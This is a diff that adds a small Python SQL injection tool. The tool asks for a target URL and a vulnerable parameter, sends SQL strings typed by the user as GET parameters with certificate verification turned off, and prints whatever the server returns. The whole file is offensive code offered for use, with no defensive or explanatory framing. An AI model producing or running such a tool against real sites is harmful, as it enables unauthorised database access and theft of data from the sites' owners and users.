@@ -1,0 +1,30 @@
+import requests
+def attempt_sql_injection(target_url, parameter, sql_query):
+    exploit_url = f"{target_url}?{parameter}={sql_query}"
+
+    try:
+        response = requests.get(exploit_url, verify=False)  # Make the request
+        if response.status_code == 200:
+            print(f"Response for query '{sql_query}':")
+            print(response.text)  # Display the response
+        else:
+            print(f"Request returned status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error during exploitation attempt: {e}")
+
+
+def main():
+    target_url = input("Enter the target URL : ")
+    parameter = input("Enter the vulnerable parameter : ")
+
+    while True:
+        sql_query = input("\nEnter your SQL query (or type 'exit' to quit): ")
+        if sql_query.lower() == 'exit':
+            break
+
+        # Attempt to inject the SQL query
+        attempt_sql_injection(target_url, parameter, sql_query)
+
+
+if __name__ == '__main__':
+    main()
